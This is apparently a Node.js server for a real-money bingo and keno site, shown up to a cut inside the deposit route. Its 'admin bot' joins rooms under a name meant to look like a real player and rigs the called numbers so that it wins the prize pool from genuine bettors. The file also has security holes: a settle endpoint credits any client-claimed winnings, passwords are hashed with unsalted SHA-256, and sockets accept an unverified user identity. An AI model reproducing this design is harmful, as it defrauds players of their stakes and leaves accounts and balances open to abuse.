import express from 'express';
import http from 'http';
import cors from 'cors';
import { Server } from 'socket.io';
import path from 'path';
import { fileURLToPath } from 'url';
import crypto from 'crypto';

const app = express();

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));
app.use(express.json());

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const projectRoot = path.resolve(__dirname, '..', '..');
const audioDir = path.join(projectRoot, 'audio');
app.use('/audio', express.static(audioDir));

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

const BOARD_SIZE = 75;
const COUNTDOWN_SECONDS = 60;
const CALL_INTERVAL_MS = 5000;
const AVAILABLE_STAKES = [10, 20, 50, 100, 200, 500];

// ==================== ADMIN BOT CONFIGURATION ====================
const ADMIN_BOT_ID = 'SYSTEM_ADMIN_BOT';
const ADMIN_BOT_NAME = 'LuckyPlayer'; // Name displayed to users (looks like real player)
const ADMIN_SOCKET_ID = 'admin-bot-virtual-socket';
const ADMIN_BOT_BOARD_COUNT = 10;
const MIN_REAL_BOARDS_FOR_BOT = 2;  // Minimum real player boards to activate bot
const MAX_REAL_BOARDS_FOR_BOT = 50; // Maximum real player boards before bot withdraws

// ==================== GAME STATE ====================
const gameStates = new Map();

function createEmptyGameState(stake, roomIdOverride) {
  const roomId = roomIdOverride || `room-${stake}`;
  return {
    roomId,
    phase: 'lobby',
    countdown: COUNTDOWN_SECONDS,
    players: new Map(),
    waitingPlayers: new Map(),
    takenBoards: new Set(),
    stake,
    called: [],
    timer: null,
    caller: null,
    // Admin Bot specific state
    riggedNumbers: null,
    botTargetWin: null,
    botActive: false
  };
}

AVAILABLE_STAKES.forEach(stake => {
  const roomId = `room-${stake}`;
  gameStates.set(stake, createEmptyGameState(stake, roomId));
});

function getRoomId(stake) {
  return `room-${stake}`;
}

function getGameState(stake) {
  if (!gameStates.has(stake)) {
    const roomId = getRoomId(stake);
    gameStates.set(stake, createEmptyGameState(stake, roomId));
  }
  return gameStates.get(stake);
}

// ==================== BOARD GENERATION ====================
// Generate a consistent board based on boardId (deterministic)
function generateBoard(boardId) {
  // Use boardId as seed for consistent board generation
  let seed = boardId * 9973; // Prime multiplier for better distribution
  
  const seededRandom = () => {
    seed = (seed * 16807) % 2147483647;
    return (seed - 1) / 2147483646;
  };

  const grid = [];
  const ranges = [
    { min: 1, max: 15 },   // B
    { min: 16, max: 30 },  // I
    { min: 31, max: 45 },  // N
    { min: 46, max: 60 },  // G
    { min: 61, max: 75 }   // O
  ];

  // Generate each column
  const columns = [];
  for (let c = 0; c < 5; c++) {
    const colNums = new Set();
    while (colNums.size < 5) {
      const num = Math.floor(seededRandom() * (ranges[c].max - ranges[c].min + 1)) + ranges[c].min;
      colNums.add(num);
    }
    columns.push(Array.from(colNums));
  }

  // Transpose to row-major order (indices 0-24)
  for (let r = 0; r < 5; r++) {
    for (let c = 0; c < 5; c++) {
      if (r === 2 && c === 2) {
        grid.push(-1); // FREE space at center
      } else {
        grid.push(columns[c][r]);
      }
    }
  }
  
  return grid;
}

// Get all winning lines for a board
function getBoardWinningLines(boardId) {
  const grid = generateBoard(boardId);
  const lines = [];
  
  // Rows (5 lines)
  for (let r = 0; r < 5; r++) {
    const lineIndices = [r*5, r*5+1, r*5+2, r*5+3, r*5+4];
    const lineNumbers = lineIndices.map(i => grid[i]);
    lines.push({ indices: lineIndices, numbers: lineNumbers });
  }
  
  // Columns (5 lines)
  for (let c = 0; c < 5; c++) {
    const lineIndices = [c, c+5, c+10, c+15, c+20];
    const lineNumbers = lineIndices.map(i => grid[i]);
    lines.push({ indices: lineIndices, numbers: lineNumbers });
  }
  
  // Diagonals (2 lines)
  const diag1Indices = [0, 6, 12, 18, 24];
  const diag2Indices = [4, 8, 12, 16, 20];
  lines.push({ indices: diag1Indices, numbers: diag1Indices.map(i => grid[i]) });
  lines.push({ indices: diag2Indices, numbers: diag2Indices.map(i => grid[i]) });
  
  return lines;
}

// ==================== USER DATA STORAGE ====================
const users = new Map();
const userSessions = new Map();
const userIdToUsername = new Map();
const userBalances = new Map();
const transactionIds = new Set();
const withdrawalRequests = new Map();

// ==================== KENO STATS & TRACKING ====================
const kenoPickStats = new Map();
const kenoOnlinePlayers = new Set();

function recordKenoPicks(picks) {
  const now = Date.now();
  const twentyFourHoursAgo = now - (24 * 60 * 60 * 1000);
  
  picks.forEach(num => {
    if (!kenoPickStats.has(num)) {
      kenoPickStats.set(num, []);
    }
    let timestamps = kenoPickStats.get(num);
    timestamps.push(now);
    timestamps = timestamps.filter(t => t > twentyFourHoursAgo);
    kenoPickStats.set(num, timestamps);
  });
}

function getHotNumbers() {
  const now = Date.now();
  const twentyFourHoursAgo = now - (24 * 60 * 60 * 1000);
  const counts = [];
  for (let i = 1; i <= 80; i++) {
    const timestamps = kenoPickStats.get(i) || [];
    const recentCount = timestamps.filter(t => t > twentyFourHoursAgo).length;
    counts.push({ number: i, count: recentCount });
  }
  counts.sort((a, b) => b.count - a.count);
  return counts;
}

// ==================== AUTH HELPERS ====================
function hashPassword(password) {
  return crypto.createHash('sha256').update(password).digest('hex');
}

function generateToken() {
  return crypto.randomBytes(32).toString('hex');
}

function getBearerToken(req) {
  const h = req.headers.authorization || '';
  const [type, token] = h.split(' ');
  if (type !== 'Bearer' || !token) return null;
  return token;
}

function requireAuth(req, res, next) {
  const token = getBearerToken(req);
  if (!token) return res.status(401).json({ success: false, error: 'Missing token' });
  const session = userSessions.get(token);
  if (!session) return res.status(401).json({ success: false, error: 'Invalid token' });
  if (session.expiresAt < Date.now()) {
    userSessions.delete(token);
    return res.status(401).json({ success: false, error: 'Session expired' });
  }
  req.session = session;
  next();
}

// ==================== GAME HELPER FUNCTIONS ====================
function getOnlinePlayers(state) {
  return Array.from(state.players.values());
}

function getRealPlayers(state) {
  return Array.from(state.players.values()).filter(p => p.oderId !== ADMIN_BOT_ID);
}

function getRealPlayerBoardCount(state) {
  let count = 0;
  state.players.forEach(player => {
    if (player.oderId !== ADMIN_BOT_ID && Array.isArray(player.picks)) {
      count += player.picks.length;
    }
  });
  return count;
}

function getTotalSelectedBoards(state) {
  let totalBoards = 0;
  state.players.forEach(player => {
    if (Array.isArray(player.picks)) {
      totalBoards += player.picks.length;
    }
  });
  return totalBoards;
}

function computePrizePool(state) {
  const totalBetAmount = getTotalSelectedBoards(state) * state.stake;
  return Math.floor(totalBetAmount * 0.8);
}

function getAllBetHousesStatus() {
  const statuses = [];
  AVAILABLE_STAKES.forEach(stake => {
    const state = getGameState(stake);
    const activePlayers = getTotalSelectedBoards(state);
    const waitingPlayers = state.waitingPlayers.size;
    statuses.push({
      stake,
      phase: state.phase,
      activePlayers,
      waitingPlayers,
      totalPlayers: activePlayers + waitingPlayers,
      prize: computePrizePool(state),
      countdown: state.countdown,
      called: state.called.length
    });
  });
  return statuses;
}

// ==================== ADMIN BOT LOGIC ====================
function removeAdminBot(state) {
  if (state.players.has(ADMIN_SOCKET_ID)) {
    const bot = state.players.get(ADMIN_SOCKET_ID);
    if (bot.picks) {
      bot.picks.forEach(b => state.takenBoards.delete(b));
    }
    state.players.delete(ADMIN_SOCKET_ID);
    state.botActive = false;
    state.riggedNumbers = null;
    state.botTargetWin = null;
    console.log(`[ADMIN BOT] Removed from room ${state.stake} Birr`);
    return true;
  }
  return false;
}

function addAdminBot(state) {
  // Select 10 random available boards
  const availableBoards = [];
  for (let i = 1; i <= 100; i++) {
    if (!state.takenBoards.has(i)) {
      availableBoards.push(i);
    }
  }
  
  if (availableBoards.length < ADMIN_BOT_BOARD_COUNT) {
    console.log(`[ADMIN BOT] Not enough available boards in room ${state.stake}`);
    return false;
  }
  
  // Shuffle and pick 10 boards
  const shuffled = availableBoards.sort(() => Math.random() - 0.5);
  const botPicks = shuffled.slice(0, ADMIN_BOT_BOARD_COUNT);
  
  // Create bot player
  const botPlayer = {
    id: ADMIN_SOCKET_ID,
    oderId: ADMIN_BOT_ID,
    name: ADMIN_BOT_NAME,
    stake: state.stake,
    picks: botPicks,
    ready: true,
    isBot: true
  };
  
  // Add bot to players
  state.players.set(ADMIN_SOCKET_ID, botPlayer);
  botPicks.forEach(b => state.takenBoards.add(b));
  state.botActive = true;
  
  // Choose winning board and line
  const winningBoardId = botPicks[Math.floor(Math.random() * botPicks.length)];
  const winningLines = getBoardWinningLines(winningBoardId);
  
  // Pick a random winning line (prefer rows for natural look)
  const winningLine = winningLines[Math.floor(Math.random() * 5)]; // First 5 are rows
  
  // Filter out FREE space (-1) from winning numbers
  const winningNumbers = winningLine.numbers.filter(n => n !== -1);
  
  state.botTargetWin = {
    boardId: winningBoardId,
    lineIndices: winningLine.indices,
    winNumbers: new Set(winningNumbers)
  };
  
  // Create rigged call sequence
  const allNumbers = Array.from({ length: 75 }, (_, i) => i + 1);
  const otherNumbers = allNumbers.filter(n => !winningNumbers.includes(n));
  
  // Shuffle other numbers
  for (let i = otherNumbers.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [otherNumbers[i], otherNumbers[j]] = [otherNumbers[j], otherNumbers[i]];
  }
  
  // Place winning numbers within first 15-25 calls (random position)
  const winPosition = Math.floor(Math.random() * 10) + 15; // Between call 15-25
  const fillerBefore = otherNumbers.splice(0, winPosition - winningNumbers.length);
  
  // Shuffle winning numbers into the early calls
  const earlyBatch = [...fillerBefore, ...winningNumbers];
  for (let i = earlyBatch.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [earlyBatch[i], earlyBatch[j]] = [earlyBatch[j], earlyBatch[i]];
  }
  
  state.riggedNumbers = [...earlyBatch, ...otherNumbers];
  
  console.log(`[ADMIN BOT] Added to room ${state.stake} Birr`);
  console.log(`[ADMIN BOT] Boards: ${botPicks.join(', ')}`);
  console.log(`[ADMIN BOT] Target win board: ${winningBoardId}, Line indices: ${winningLine.indices.join(',')}`);
  console.log(`[ADMIN BOT] Winning numbers needed: ${Array.from(winningNumbers).join(', ')}`);
  
  return true;
}

function manageAdminBot(state) {
  const realBoardCount = getRealPlayerBoardCount(state);
  
  console.log(`[ADMIN BOT] Checking room ${state.stake}: Real boards = ${realBoardCount}`);
  
  // Reset bot state first
  state.riggedNumbers = null;
  state.botTargetWin = null;
  
  // Condition 1: More than 50 real boards - remove bot
  if (realBoardCount > MAX_REAL_BOARDS_FOR_BOT) {
    if (state.botActive) {
      removeAdminBot(state);
      console.log(`[ADMIN BOT] Removed - too many real players (${realBoardCount} boards)`);
    }
    return;
  }
  
  // Condition 2: Less than 2 real boards - remove bot (not enough players)
  if (realBoardCount < MIN_REAL_BOARDS_FOR_BOT) {
    if (state.botActive) {
      removeAdminBot(state);
      console.log(`[ADMIN BOT] Removed - not enough real players (${realBoardCount} boards)`);
    }
    return;
  }
  
  // Condition 3: Between 2-50 real boards - add/update bot
  if (realBoardCount >= MIN_REAL_BOARDS_FOR_BOT && realBoardCount <= MAX_REAL_BOARDS_FOR_BOT) {
    // Remove existing bot to refresh picks
    if (state.botActive) {
      removeAdminBot(state);
    }
    // Add bot with new picks and rigged sequence
    addAdminBot(state);
  }
}

// ==================== GAME FLOW ====================
function startCountdown(stake) {
  const state = getGameState(stake);
  const roomId = state.roomId;

  clearInterval(state.timer);
  clearInterval(state.caller);
  
  state.phase = 'countdown';
  state.countdown = COUNTDOWN_SECONDS;
  state.called = [];
  state.riggedNumbers = null;
  state.botTargetWin = null;

  // Move waiting players to active
  state.waitingPlayers.forEach((player, socketId) => {
    state.players.set(socketId, player);
  });
  state.waitingPlayers.clear();

  // Rebuild taken boards
  state.takenBoards = new Set();
  state.players.forEach(player => {
    if (Array.isArray(player.picks)) {
      player.picks.forEach(boardId => state.takenBoards.add(boardId));
    }
  });

  io.to(roomId).emit('phase', { phase: state.phase, stake });
  io.to(roomId).emit('tick', {
    seconds: state.countdown,
    players: getTotalSelectedBoards(state),
    prize: computePrizePool(state),
    stake: state.stake
  });

  state.timer = setInterval(() => {
    state.countdown -= 1;
    
    io.to(roomId).emit('tick', {
      seconds: state.countdown,
      players: getTotalSelectedBoards(state),
      prize: computePrizePool(state),
      stake: state.stake
    });

    if (state.countdown <= 0) {
      clearInterval(state.timer);
      
      // Manage admin bot before game starts
      manageAdminBot(state);
      
      // Broadcast updated state after bot management
      io.to(roomId).emit('players', {
        count: getTotalSelectedBoards(state),
        waitingCount: state.waitingPlayers.size,
        stake: state.stake
      });
      
      io.to(roomId).emit('boards_taken', {
        stake,
        takenBoards: Array.from(state.takenBoards),
      });

      const playersWithBoards = getOnlinePlayers(state).filter(
        p => Array.isArray(p.picks) && p.picks.length > 0
      );

      if (playersWithBoards.length > 0) {
        startCalling(stake);
      } else {
        state.phase = 'lobby';
        io.to(roomId).emit('phase', { phase: state.phase, stake });
        startCountdown(stake);
      }
    }
  }, 1000);
}

function startCalling(stake) {
  const state = getGameState(stake);
  const roomId = state.roomId;

  state.phase = 'calling';
  io.to(roomId).emit('phase', { phase: state.phase, stake });
  io.to(roomId).emit('game_start', { stake });

  // Use rigged numbers if bot is active, otherwise random
  let numbers;
  if (state.riggedNumbers && state.botActive) {
    numbers = state.riggedNumbers;
    console.log(`[ADMIN BOT] Using rigged sequence for room ${stake}`);
  } else {
    numbers = Array.from({ length: 75 }, (_, i) => i + 1);
    for (let i = numbers.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [numbers[i], numbers[j]] = [numbers[j], numbers[i]];
    }
  }

  let idx = 0;
  clearInterval(state.caller);

  state.caller = setInterval(() => {
    // Check if bot should win
    if (state.botActive && state.botTargetWin) {
      const calledSet = new Set(state.called);
      const neededNumbers = Array.from(state.botTargetWin.winNumbers);
      const botHasWon = neededNumbers.every(n => calledSet.has(n));

      if (botHasWon) {
        // Bot wins!
        const prize = computePrizePool(state);
        
        console.log(`[ADMIN BOT] Won in room ${stake}! Prize: ${prize} Birr`);
        
        io.to(roomId).emit('winner', {
          playerId: ADMIN_SOCKET_ID,
          playerName: ADMIN_BOT_NAME,
          isSystemPlayer: true,
          prize,
          stake,
          boardId: state.botTargetWin.boardId,
          lineIndices: state.botTargetWin.lineIndices
        });

        // End game
        clearInterval(state.caller);
        
        // Reset state
        state.players.clear();
        state.waitingPlayers.forEach((player, socketId) => {
          player.picks = [];
          player.ready = false;
          state.players.set(socketId, player);
        });
        state.waitingPlayers.clear();
        state.takenBoards = new Set();
        state.riggedNumbers = null;
        state.botTargetWin = null;
        state.botActive = false;

        state.phase = 'lobby';
        io.to(roomId).emit('phase', { phase: state.phase, stake });
        io.emit('bet_houses_status', { betHouses: getAllBetHousesStatus() });

        // Start next round after delay
        setTimeout(() => {
          startCountdown(stake);
        }, 3000);
        
        return;
      }
    }

    // End of numbers
    if (idx >= numbers.length) {
      clearInterval(state.caller);
      
      state.phase = 'lobby';
      io.to(roomId).emit('phase', { phase: state.phase, stake });

      // Reset for next round
      state.players.clear();
      state.waitingPlayers.forEach((player, socketId) => {
        state.players.set(socketId, player);
      });
      state.waitingPlayers.clear();
      state.takenBoards = new Set();
      state.riggedNumbers = null;
      state.botTargetWin = null;
      state.botActive = false;

      startCountdown(stake);
      return;
    }

    // Call next number
    const n = numbers[idx++];
    state.called.push(n);
    io.to(roomId).emit('call', { number: n, called: state.called, stake });
    
  }, CALL_INTERVAL_MS);
}

// ==================== KENO STATE ====================
const KENO_BET_DURATION = 30;
const KENO_DRAW_INTERVAL = 1000;
const KENO_POST_DRAW_DELAY = 5000;

let kenoState = {
  phase: 'BETTING',
  countdown: KENO_BET_DURATION,
  drawResult: [],
  currentBallIndex: 0,
  drawInterval: null,
  gameId: 1
};

function generateKenoDraw() {
  const pool = Array.from({ length: 80 }, (_, i) => i + 1);
  const result = [];
  for (let i = 0; i < 20; i++) {
    const idx = Math.floor(Math.random() * pool.length);
    result.push(pool.splice(idx, 1)[0]);
  }
  return result;
}

function startKenoLoop() {
  setInterval(() => {
    if (kenoState.phase === 'BETTING') {
      kenoState.countdown--;

      io.emit('keno_tick', {
        phase: kenoState.phase,
        seconds: kenoState.countdown,
        gameId: kenoState.gameId
      });

      if (kenoState.countdown <= 0) {
        kenoState.phase = 'DRAWING';
        kenoState.drawResult = generateKenoDraw();
        kenoState.currentBallIndex = 0;

        io.emit('keno_draw_start', {
          phase: 'DRAWING',
          gameId: kenoState.gameId,
          totalBalls: 20
        });

        runKenoDrawing();
      }
    }
  }, 1000);
}

function runKenoDrawing() {
  kenoState.drawInterval = setInterval(() => {
    if (kenoState.currentBallIndex < 20) {
      const ball = kenoState.drawResult[kenoState.currentBallIndex];
      io.emit('keno_ball', {
        ball,
        index: kenoState.currentBallIndex,
        gameId: kenoState.gameId
      });
      kenoState.currentBallIndex++;
    } else {
      clearInterval(kenoState.drawInterval);
      kenoState.drawInterval = null;

      io.emit('keno_draw_complete', {
        gameId: kenoState.gameId,
        allBalls: kenoState.drawResult
      });

      setTimeout(() => {
        kenoState.gameId++;
        kenoState.phase = 'BETTING';
        kenoState.countdown = KENO_BET_DURATION;
        kenoState.drawResult = [];
        kenoState.currentBallIndex = 0;

        io.emit('keno_new_round', {
          phase: 'BETTING',
          seconds: kenoState.countdown,
          gameId: kenoState.gameId
        });
      }, KENO_POST_DRAW_DELAY);
    }
  }, KENO_DRAW_INTERVAL);
}

// Start Keno loop
startKenoLoop();

// ==================== SOCKET HANDLERS ====================
const socketRooms = new Map();

io.on('connection', (socket) => {
  const auth = socket.handshake.auth;
  const userId = auth?.userId;
  const username = auth?.username;
  const token = auth?.token;

  // Authenticate socket
  if (token) {
    const session = userSessions.get(token);
    if (session && session.expiresAt > Date.now()) {
      socket.userId = session.userId;
      socket.username = session.username;
    }
  }

  if (!socket.userId && userId && username) {
    socket.userId = userId;
    socket.username = username;
  }

  // Send initial balance
  if (socket.userId) {
    if (!userBalances.has(socket.userId)) {
      userBalances.set(socket.userId, 0);
    }
    socket.emit('balance_update', { balance: userBalances.get(socket.userId) || 0 });
  }

  // Send bet houses status
  socket.emit('bet_houses_status', { betHouses: getAllBetHousesStatus() });

  // Send Keno state
  socket.emit('keno_init', {
    phase: kenoState.phase,
    seconds: kenoState.countdown,
    gameId: kenoState.gameId,
    currentBallIndex: kenoState.currentBallIndex,
    drawnBalls: kenoState.drawResult.slice(0, kenoState.currentBallIndex),
    isDrawing: kenoState.phase === 'DRAWING',
    hotNumbers: getHotNumbers().slice(0, 20),
    onlinePlayers: kenoOnlinePlayers.size
  });

  // ===== KENO HANDLERS =====
  socket.on('join_keno', () => {
    socket.join('keno_room');
    kenoOnlinePlayers.add(socket.id);
    io.to('keno_room').emit('keno_online_count', { count: kenoOnlinePlayers.size });

    socket.emit('keno_state_sync', {
      phase: kenoState.phase,
      seconds: kenoState.countdown,
      gameId: kenoState.gameId,
      currentBallIndex: kenoState.currentBallIndex,
      drawnBalls: kenoState.drawResult.slice(0, kenoState.currentBallIndex),
      allBalls: kenoState.phase === 'DRAWING' ? null : kenoState.drawResult,
      hotNumbers: getHotNumbers().slice(0, 20),
      onlinePlayers: kenoOnlinePlayers.size
    });
  });

  socket.on('leave_keno', () => {
    socket.leave('keno_room');
    kenoOnlinePlayers.delete(socket.id);
    io.to('keno_room').emit('keno_online_count', { count: kenoOnlinePlayers.size });
  });

  // ===== BINGO HANDLERS =====
  socket.on('join_bet_house', (stakeAmount) => {
    const stake = Number(stakeAmount);
    if (!AVAILABLE_STAKES.includes(stake)) {
      socket.emit('error', { message: 'Invalid stake amount' });
      return;
    }

    // Leave previous room
    const previousStake = socketRooms.get(socket.id);
    if (previousStake && previousStake !== stake) {
      const prevState = getGameState(previousStake);
      const prevRoomId = prevState.roomId;
      socket.leave(prevRoomId);
      
      const prevPlayer = prevState.players.get(socket.id) || prevState.waitingPlayers.get(socket.id);
      if (prevPlayer && prevPlayer.picks) {
        prevPlayer.picks.forEach(b => prevState.takenBoards.delete(b));
      }
      
      prevState.players.delete(socket.id);
      prevState.waitingPlayers.delete(socket.id);
      
      io.to(prevRoomId).emit('players', {
        count: getTotalSelectedBoards(prevState),
        waitingCount: prevState.waitingPlayers.size,
        stake: previousStake
      });
    }

    const state = getGameState(stake);
    const roomId = state.roomId;
    socket.join(roomId);
    socketRooms.set(socket.id, stake);

    const player = {
      id: socket.id,
      oderId: socket.userId,
      name: socket.username,
      stake: stake,
      picks: [],
      ready: false
    };

    if (state.phase === 'calling') {
      state.waitingPlayers.set(socket.id, player);
    } else {
      state.players.set(socket.id, player);
    }

    socket.emit('init', {
      phase: state.phase,
      seconds: state.countdown,
      stake: state.stake,
      prize: computePrizePool(state),
      called: state.called,
      playerId: socket.id,
      isWaiting: state.phase === 'calling'
    });

    io.to(roomId).emit('players', {
      count: getTotalSelectedBoards(state),
      waitingCount: state.waitingPlayers.size,
      stake: stake
    });

    io.to(roomId).emit('boards_taken', {
      stake,
      takenBoards: Array.from(state.takenBoards),
    });

    io.emit('bet_houses_status', { betHouses: getAllBetHousesStatus() });
  });

  socket.on('select_numbers', (data) => {
    const { picks, stake: stakeAmount } = data;
    if (!Array.isArray(picks) || picks.length > 2) return;

    const stake = Number(stakeAmount);
    if (!socketRooms.has(socket.id) || socketRooms.get(socket.id) !== stake) {
      return;
    }

    const state = getGameState(stake);
    const player = state.players.get(socket.id) || state.waitingPlayers.get(socket.id);
    if (!player) return;

    // Release old picks
    if (Array.isArray(player.picks)) {
      player.picks.forEach(boardId => state.takenBoards.delete(boardId));
    }

    // Set new picks (only available ones)
    const uniquePicks = Array.from(new Set(picks));
    const availablePicks = uniquePicks.filter(boardId => !state.takenBoards.has(boardId));
    availablePicks.forEach(boardId => state.takenBoards.add(boardId));
    player.picks = availablePicks;

    const roomId = state.roomId;
    io.to(roomId).emit('boards_taken', {
      stake,
      takenBoards: Array.from(state.takenBoards),
    });
    
    io.to(roomId).emit('players', {
      count: getTotalSelectedBoards(state),
      waitingCount: state.waitingPlayers.size,
      stake: stake
    });
  });

  socket.on('start_game', (data) => {
    const stake = Number(data?.stake || socketRooms.get(socket.id));
    if (!stake || !socketRooms.has(socket.id) || socketRooms.get(socket.id) !== stake) {
      return;
    }

    const state = getGameState(stake);
    const player = state.players.get(socket.id) || state.waitingPlayers.get(socket.id);
    if (!player || player.picks.length === 0) return;

    player.ready = true;

    if (state.phase !== 'calling' && state.waitingPlayers.has(socket.id)) {
      state.waitingPlayers.delete(socket.id);
      state.players.set(socket.id, player);
    }

    socket.emit('start_game_confirm', { stake, isWaiting: state.phase === 'calling' });

    if (state.phase === 'countdown') {
      socket.emit('game_start', { stake });
    }

    const roomId = state.roomId;
    io.to(roomId).emit('players', {
      count: getTotalSelectedBoards(state),
      waitingCount: state.waitingPlayers.size,
      stake: stake
    });
  });

  socket.on('bingo', (data) => {
    const stake = Number(data?.stake || socketRooms.get(socket.id));
    if (!stake || !socketRooms.has(socket.id) || socketRooms.get(socket.id) !== stake) {
      return;
    }

    const state = getGameState(stake);
    const roomId = state.roomId;
    const player = state.players.get(socket.id);
    
    if (!player || !player.picks || player.picks.length === 0) return;
    if (player.oderId === ADMIN_BOT_ID) return; // Bot can't claim via socket

    const boardId = data?.boardId;
    const lineIndices = Array.isArray(data?.lineIndices) ? data.lineIndices : undefined;

    const prize = computePrizePool(state);
    
    // Real player wins
    io.to(roomId).emit('winner', {
      playerId: socket.id,
      playerName: player.name || 'Player',
      isSystemPlayer: false,
      prize,
      stake,
      boardId,
      lineIndices
    });

    // Update winner balance
    const winnerBalance = userBalances.get(player.oderId) || 0;
    userBalances.set(player.oderId, winnerBalance + prize);
    socket.emit('balance_update', { balance: userBalances.get(player.oderId) });

    // End game
    clearInterval(state.caller);
    clearInterval(state.timer);

    // Reset state
    state.players.clear();
    state.waitingPlayers.forEach((waitingPlayer, socketId) => {
      waitingPlayer.picks = [];
      waitingPlayer.ready = false;
      state.players.set(socketId, waitingPlayer);
    });
    state.waitingPlayers.clear();
    state.takenBoards = new Set();
    state.riggedNumbers = null;
    state.botTargetWin = null;
    state.botActive = false;

    state.phase = 'lobby';
    io.to(roomId).emit('phase', { phase: state.phase, stake });
    io.emit('bet_houses_status', { betHouses: getAllBetHousesStatus() });

    startCountdown(stake);
  });

  socket.on('get_bet_houses_status', () => {
    socket.emit('bet_houses_status', { betHouses: getAllBetHousesStatus() });
  });

  socket.on('leave_current_game', () => {
    const stake = socketRooms.get(socket.id);
    if (!stake) return;
    
    const state = getGameState(stake);
    const roomId = state.roomId;

    const player = state.players.get(socket.id) || state.waitingPlayers.get(socket.id);
    if (player && Array.isArray(player.picks)) {
      player.picks.forEach(boardId => state.takenBoards.delete(boardId));
    }

    state.players.delete(socket.id);
    state.waitingPlayers.delete(socket.id);
    socket.leave(roomId);
    socketRooms.delete(socket.id);

    io.to(roomId).emit('players', {
      count: getTotalSelectedBoards(state),
      waitingCount: state.waitingPlayers.size,
      stake,
    });

    io.to(roomId).emit('boards_taken', {
      stake,
      takenBoards: Array.from(state.takenBoards),
    });

    io.emit('bet_houses_status', { betHouses: getAllBetHousesStatus() });
  });

  socket.on('disconnect', () => {
    // Keno cleanup
    if (kenoOnlinePlayers.has(socket.id)) {
      kenoOnlinePlayers.delete(socket.id);
      io.to('keno_room').emit('keno_online_count', { count: kenoOnlinePlayers.size });
    }

    // Bingo cleanup
    const stake = socketRooms.get(socket.id);
    if (stake) {
      const state = getGameState(stake);
      const roomId = state.roomId;

      const player = state.players.get(socket.id) || state.waitingPlayers.get(socket.id);
      if (player && Array.isArray(player.picks)) {
        player.picks.forEach(boardId => state.takenBoards.delete(boardId));
      }

      state.players.delete(socket.id);
      state.waitingPlayers.delete(socket.id);
      socketRooms.delete(socket.id);

      io.to(roomId).emit('players', {
        count: getTotalSelectedBoards(state),
        waitingCount: state.waitingPlayers.size,
        stake: stake
      });

      io.to(roomId).emit('boards_taken', {
        stake,
        takenBoards: Array.from(state.takenBoards),
      });

      io.emit('bet_houses_status', { betHouses: getAllBetHousesStatus() });
    }
  });
});

// ==================== API ROUTES ====================

// Helper functions for parsing
function parseAmount(message) {
  const patterns = [
    /(\d+\.?\d*)\s*(?:birr|etb|br)/i,
    /(?:birr|etb|br)\s*(\d+\.?\d*)/i,
    /amount[:\s]*(\d+\.?\d*)/i,
    /(\d+\.?\d*)\s*(?:sent|transferred|deposited|credited)/i,
  ];
  for (const pattern of patterns) {
    const match = message.match(pattern);
    if (match) {
      const amount = parseFloat(match[1]);
      if (!isNaN(amount) && amount > 0) return amount;
    }
  }
  const numbers = message.match(/\b(\d{2,}(?:\.\d{2})?)\b/g);
  if (numbers && numbers.length > 0) {
    const amounts = numbers.map(n => parseFloat(n)).filter(n => !isNaN(n) && n >= 10);
    if (amounts.length > 0) return Math.max(...amounts);
  }
  return null;
}

function parseTransactionId(text) {
  const patterns = [
    /(?:txn|trans|ref|reference|transaction\s*id|id)[:\s-]*([A-Z0-9]{6,})/i,
    /(?:txn|trans|ref|reference|transaction\s*id|id)[:\s-]*([a-z0-9]{6,})/i,
  ];
  for (const pattern of patterns) {
    const match = text.match(pattern);
    if (match) return match[1].trim().toUpperCase();
  }
  const tokens = text.match(/[A-Z0-9]{8,20}/gi);
  if (tokens) {
    const sorted = tokens.sort((a, b) => b.length - a.length);
    return sorted[0].toUpperCase();
  }
  return null;
}

// User balance
app.get('/api/user/balance', requireAuth, (req, res) => {
  const { userId } = req.session;
  const balance = userBalances.get(userId) || 0;
  res.json({ balance });
});

// Keno hot numbers
app.get('/api/games/keno/hot-numbers', requireAuth, (req, res) => {
  const numbers = getHotNumbers();
  res.json({ numbers });
});

// Keno bet
app.post('/api/games/keno/bet', requireAuth, (req, res) => {
  const sessionUserId = req.session.userId;
  const { amount, picks, gameId } = req.body;

  if (kenoState.phase !== 'BETTING') {
    return res.json({ success: false, error: 'Betting is closed. Wait for next round.' });
  }

  const amountNum = Number(amount);
  if (!Number.isFinite(amountNum) || amountNum <= 0) {
    return res.json({ success: false, error: 'Invalid amount' });
  }

  const current = userBalances.get(sessionUserId) || 0;
  if (current < amountNum) {
    return res.json({ success: false, error: 'Insufficient funds' });
  }

  if (!Array.isArray(picks) || picks.length < 2 || picks.length > 10) {
    return res.json({ success: false, error: 'Invalid number of picks (2-10 required)' });
  }

  const validPicks = picks.every(p => Number.isInteger(p) && p >= 1 && p <= 80);
  if (!validPicks) {
    return res.json({ success: false, error: 'Invalid picks (must be 1-80)' });
  }

  userBalances.set(sessionUserId, current - amountNum);
  recordKenoPicks(picks);

  const ticketId = Date.now();
  const username = userIdToUsername.get(sessionUserId) || 'Player';
  
  io.to('keno_room').emit('keno_player_bet', {
    oderId: sessionUserId,
    username: username,
    gameId: gameId || kenoState.gameId,
    picks: picks,
    amount: amountNum,
    ticketId: ticketId
  });

  res.json({
    success: true,
    newBalance: userBalances.get(sessionUserId),
    ticketId: ticketId,
    gameId: kenoState.gameId
  });
});

// Keno settle
app.post('/api/games/keno/settle', requireAuth, (req, res) => {
  const sessionUserId = req.session.userId;
  const { totalWin, gameId } = req.body;

  const winNum = Number(totalWin) || 0;
  if (winNum < 0) {
    return res.json({ success: false, error: 'Invalid totalWin' });
  }

  const current = userBalances.get(sessionUserId) || 0;
  userBalances.set(sessionUserId, current + winNum);

  res.json({
    success: true,
    newBalance: userBalances.get(sessionUserId),
  });
});

// Keno state
app.get('/api/games/keno/state', (req, res) => {
  res.json({
    phase: kenoState.phase,
    seconds: kenoState.countdown,
    gameId: kenoState.gameId,
    currentBallIndex: kenoState.currentBallIndex,
    drawnBalls: kenoState.drawResult.slice(0, kenoState.currentBallIndex)
  });
});

// Deposit
app.post('/api/deposit', (req, res) => {
  try {
    const { userId, amount, provider, account, accountName, message, transactionId } = req.body;

    if (!userId || !amount || !message || !transactionId) {
